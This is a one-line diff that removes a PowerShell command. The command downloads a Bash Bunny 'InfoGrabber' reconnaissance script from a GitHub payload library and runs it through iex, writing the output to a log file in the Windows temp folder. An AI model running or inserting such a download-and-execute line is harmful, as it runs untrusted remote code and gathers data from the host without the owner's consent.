@@ -1,1 +1,0 @@
-cd C:\WINDOWS\Temp; (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/hak5/bashbunny-payloads/master/payloads/library/recon/InfoGrabber/info.ps1') | iex | echo > log.txt
